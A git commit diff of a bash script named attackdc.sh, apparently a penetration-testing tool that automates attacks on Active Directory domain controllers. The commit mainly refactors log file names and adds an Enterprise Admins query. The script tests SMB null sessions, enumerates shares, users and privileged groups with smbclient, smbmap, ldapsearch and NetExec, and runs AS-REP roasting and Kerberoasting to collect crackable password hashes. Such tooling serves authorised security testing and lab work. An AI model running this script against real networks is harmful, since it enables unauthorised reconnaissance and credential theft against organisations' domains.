006e42c1819808c92d9239d98d4f4525f85f013c
toneillcodes <148013535+toneillcodes@users.noreply.github.com>
2025-02-23 21:38:19 -0500

    Update attackdc.sh

--- attackdc.sh
+++ attackdc.sh
@@ -1,12 +1,12 @@
 #!/bin/bash
 
 function printhelp() {
-        echo "Usage: $0 -t HOSTNAME/IP [-u USERNAME] [-p PASSWORD] [-d DOMAIN]"
+	echo "Usage: $0 -t HOSTNAME/IP [-u USERNAME] [-p PASSWORD] [-d DOMAIN]"
 }
 
 if [ $# -eq 0 ]; then
-        printhelp
-        exit 1
+	printhelp
+	exit 1
 fi
 
 while getopts "t:u:p:d:" option; do
@@ -32,9 +32,9 @@ while getopts "t:u:p:d:" option; do
 done
 
 if [ -z $target ]; then
-        echo "target required"
-        printhelp
-        exit 1
+	echo "target required"
+	printhelp
+	exit 1
 fi
 
 timestamp=`date +"%Y%m%d-%H%M%S"`
@@ -62,27 +62,28 @@ fi
 # SMB
 if grep -qE '^(139,)+|(,139,)|(,139$)' port-list-$target.txt || grep -qE '^(445,)+|(,445,)|(,445$)' port-list-$target.txt; then
     echo "[*] Running SMB module."
-        echo "Testing NULL sessions" | tee -a smb-recon-$target-$timestamp.txt
-        smbclient -L "\\\\$target" -U " "%" " >> smb-recon-$target-$timestamp.txt
-        if grep "NT_STATUS_LOGON_FAILURE" smb-recon-$target-$timestamp.txt; then
+		smb_log_file=smb-recon-$target-$timestamp.txt
+        echo "Testing NULL sessions" | tee -a $smb_log_file
+        smbclient -L "\\\\$target" -U " "%" " >> $smb_log_file
+        if grep "NT_STATUS_LOGON_FAILURE" $smb_log_file; then
             echo "NULL session check failed with NT_STATUS_LOGON_FAILURE" >> smb-recon-$target.txt
         else
-            echo "NULL session success!! (validation command: smbclient -L \\\\$target -U \" \"%\" \")" | tee -a smb-recon-$target-$timestamp.txt
+            echo "NULL session success!! (validation command: smbclient -L \\\\$target -U \" \"%\" \")" | tee -a $smb_log_file
         fi
         if [ ! -z $user ] && [ ! -z $password ]; then
-			echo "[*] Credentials detected, using ($user:$password) for SMB enumeration" >> smb-recon-$target-$timestamp.txt
+			echo "[*] Credentials detected, using ($user:$password) for SMB enumeration" >> $smb_log_file
 			echo "[*] Running smbclient query"
-   			echo "smbclient output:" >> smb-recon-$target-$timestamp.txt
-			smbclient -L "\\\\$target" -U "$user"%"$password" >> smb-recon-$target-$timestamp.txt
-   			echo "" >> smb-recon-$target-$timestamp.txt
+   			echo "smbclient output:" >> $smb_log_file
+			smbclient -L "\\\\$target" -U "$user"%"$password" >> $smb_log_file
+   			echo "" >> $smb_log_file
 			echo "[*] Running smbmap query"
-   			echo "smbmap output:" >> smb-recon-$target-$timestamp.txt
-			smbmap -u $user -p $password -H $target  >> smb-recon-$target-$timestamp.txt
-   			echo "" >> smb-recon-$target-$timestamp.txt
-   			echo "Readable shares:" >> smb-recon-$target-$timestamp.txt
+   			echo "smbmap output:" >> $smb_log_file
+			smbmap -u $user -p $password -H $target  >> $smb_log_file
+   			echo "" >> $smb_log_file
+   			echo "Readable shares:" >> $smb_log_file
       			nxc smb $target -u $user -p $password --shares --filter-shares READ
-	 		echo "" >> smb-recon-$target-$timestamp.txt
-    			echo "Writeable shares:" >> smb-recon-$target-$timestamp.txt
+	 		echo "" >> $smb_log_file
+    			echo "Writeable shares:" >> $smb_log_file
       			nxc smb $target -u $user -p $password --shares --filter-shares WRITE
         fi
         echo "[*] SMB module complete."
@@ -91,21 +92,22 @@ fi
 # LDAP
 if grep -qE '^(389,)+|(,389,)|(,389$)' port-list-$target.txt || grep -qE '^(636,)+|(,636,)|(,636$)' port-list-$target.txt; then
     echo "[*] Running LDAP module."
+	ldap_log_file=ldap-info-$target-$timestamp.txt
 	echo "[*] Running ldapsearch queries"
-	ldapsearch -H ldap://$target -x -s base -b '' "(objectClass=*)" "*" > ldap-info-$target-$timestamp.txt 
+	ldapsearch -H ldap://$target -x -s base -b '' "(objectClass=*)" "*" > $ldap_log_file 
 
-	ldap_dns_hostname=$(grep dnsHostName ldap-info-$target-$timestamp.txt | awk '{print $2}')
+	ldap_dns_hostname=$(grep dnsHostName $ldap_log_file | awk '{print $2}')
 	echo "LDAP DNS Hostname: $ldap_dns_hostname" >> ldap-recon-$target-$timestamp.txt
 
-	ldap_domain_name=$(grep ldapServiceName ldap-info-$target-$timestamp.txt | cut -d ':' -f2)
+	ldap_domain_name=$(grep ldapServiceName $ldap_log_file | cut -d ':' -f2)
 	echo "LDAP Domain Name: $ldap_domain_name" >> ldap-recon-$target-$timestamp.txt
 
-	base_dn=$(grep rootDomainNamingContext ldap-info-$target-$timestamp.txt | awk '{print $2}')
+	base_dn=$(grep rootDomainNamingContext $ldap_log_file | awk '{print $2}')
 	echo "LDAP Root Domain Naming Context: $base_dn" >> ldap-recon-$target-$timestamp.txt
 
 	if [ ! -z $user ] && [ ! -z $password ]; then
 		if [ -z $domain ]; then
-				domain=$ldap_domain_name
+			domain=$ldap_domain_name
 		fi
 	
 		if grep -qE "^TLS_REQCERT allow" /etc/ldap/ldap.conf; then
@@ -124,45 +126,49 @@ if grep -qE '^(389,)+|(,389,)|(,389$)' port-list-$target.txt || grep -qE '^(636,
 		########################################
 		# Run NetExec
 		########################################
-		echo "[*] Running nxc LDAP enum with credentials $user:$password (nxc-recon-$target-$timestamp.txt)"
+		nxc_log_file=nxc-recon-$target-$timestamp.txt
+		echo "[*] Running nxc LDAP enum with credentials $user:$password ($nxc_log_file)"
 		# clear the file and output the scan timestamp
-		echo "Scan timestamp: $timestamp" > nxc-recon-$target-$timestamp.txt
-		echo "Running against target: $target with $user:$password (nxc-recon-$target-$timestamp.txt)" >> nxc-recon-$target-$timestamp.txt
-		echo "NXC Domain SID:" >> nxc-recon-$target-$timestamp.txt
-		nxc ldap $target -u $user -p $password --get-sid >> nxc-recon-$target-$timestamp.txt
-		echo "" >> nxc-recon-$target-$timestamp.txt
-		echo "NXC Users:" >> nxc-recon-$target-$timestamp.txt
-		nxc ldap $target -u $user -p $password  --users >> nxc-recon-$target-$timestamp.txt
-		echo "" >> nxc-recon-$target-$timestamp.txt
-		echo "NXC Groups:" >> nxc-recon-$target-$timestamp.txt
-		nxc ldap $target -u $user -p $password  --groups >> nxc-recon-$target-$timestamp.txt
-		echo "" >> nxc-recon-$target-$timestamp.txt
-		echo "NXC Password Not Required:" >> nxc-recon-$target-$timestamp.txt
-		nxc ldap $target -u $user -p $password --password-not-required >> nxc-recon-$target-$timestamp.txt
-		echo "" >> nxc-recon-$target-$timestamp.txt
-		echo "NXC Domain Admins:" >> nxc-recon-$target-$timestamp.txt
-		nxc ldap $target -u $user -p $password -M group-mem -o GROUP="Domain Admins" >> nxc-recon-$target-$timestamp.txt
-		echo "" >> nxc-recon-$target-$timestamp.txt
-		echo "NXC DnsAdmins:" >> nxc-recon-$target-$timestamp.txt
-		nxc ldap $target -u $user -p $password -M group-mem -o GROUP="DnsAdmins" >> nxc-recon-$target-$timestamp.txt
-		echo "" >> nxc-recon-$target-$timestamp.txt
-                # nxc ldap $target -d "domain" -u $user -p $password -M adcs
+		echo "Scan timestamp: $timestamp" > $nxc_log_file
+		echo "Running against target: $target with $user:$password ($nxc_log_file)" >> $nxc_log_file
+		echo "NXC Domain SID:" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password --get-sid >> $nxc_log_file
+		echo "" >> $nxc_log_file
+		echo "NXC Users:" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password  --users >> $nxc_log_file
+		echo "" >> $nxc_log_file
+		echo "NXC Groups:" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password  --groups >> $nxc_log_file
+		echo "" >> $nxc_log_file
+		echo "NXC Password Not Required:" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password --password-not-required >> $nxc_log_file
+		echo "" >> $nxc_log_file
+		echo "NXC Domain Admins:" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password -M group-mem -o GROUP="Domain Admins" >> $nxc_log_file
+		echo "" >> $nxc_log_file
+		echo "NXC Enterprise Admins:" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password -M group-mem -o GROUP="Enterprise Admins" >> $nxc_log_file
+		echo "" >> $nxc_log_file		
+		echo "NXC DnsAdmins:" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password -M group-mem -o GROUP="DnsAdmins" >> $nxc_log_file
+		echo "" >> $nxc_log_file
+		# nxc ldap $target -d "domain" -u $user -p $password -M adcs
 		truncate -s 0 nxc-aspreproast-output-$target-$timestamp.txt
-		echo "NXC AS-REP Roasting in nxc-aspreproast-output-$target-$timestamp.txt" >> nxc-recon-$target-$timestamp.txt
-		nxc ldap $target -u $user -p $password --asreproast nxc-aspreproast-output-$target-$timestamp.txt >> nxc-recon-$target-$timestamp.txt
-		echo "" >> nxc-recon-$target-$timestamp.txt
+		echo "NXC AS-REP Roasting in nxc-aspreproast-output-$target-$timestamp.txt" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password --asreproast nxc-aspreproast-output-$target-$timestamp.txt >> $nxc_log_file
+		echo "" >> $nxc_log_file
 		truncate -s 0 nxc-krbroast-output-$target-$timestamp.txt
-		echo "NXC Kerberoasting in nxc-krbroast-output.txt" >> nxc-recon-$target-$timestamp.txt
-		nxc ldap $target -u $user -p $password --kerberoasting nxc-krbroast-output-$target-$timestamp.txt >> nxc-recon-$target-$timestamp.txt
-		if grep KRB_AP_ERR_SKEW nxc-recon-$target-$timestamp.txt | cut -d ' ' -f 2; then
-			echo "[*] WARN: Clock skew detected in kerberoasting results, attempting to sync with target..." >> nxc-recon-$target-$timestamp.txt
-			date && sudo ntpdate $target && date >> nxc-recon-$target-$timestamp.txt
-			echo "[*] Re-running NXC kerberoasting" >> nxc-recon-$target-$timestamp.txt
-			nxc ldap $target -u $user -p $password --kerberoasting nxc-krbroast-output-$target-$timestamp.txt >> nxc-recon-$target-$timestamp.txt
+		echo "NXC Kerberoasting in nxc-krbroast-output.txt" >> $nxc_log_file
+		nxc ldap $target -u $user -p $password --kerberoasting nxc-krbroast-output-$target-$timestamp.txt >> $nxc_log_file
+		if grep KRB_AP_ERR_SKEW $nxc_log_file | cut -d ' ' -f 2; then
+			echo "[*] WARN: Clock skew detected in kerberoasting results, attempting to sync with target..." >> $nxc_log_file
+			date && sudo ntpdate $target && date >> $nxc_log_file
+			echo "[*] Re-running NXC kerberoasting" >> $nxc_log_file
+			nxc ldap $target -u $user -p $password --kerberoasting nxc-krbroast-output-$target-$timestamp.txt >> $nxc_log_file
 		fi
         else
-                #Run ldapsearch, Run windapsearch, Run NetExec
-                echo "Running unauthenticated LDAP enum"
+			#Run ldapsearch, Run windapsearch, Run NetExec
+			echo "Running unauthenticated LDAP enum"
         fi
         echo "[*] LDAP module complete."
 fi
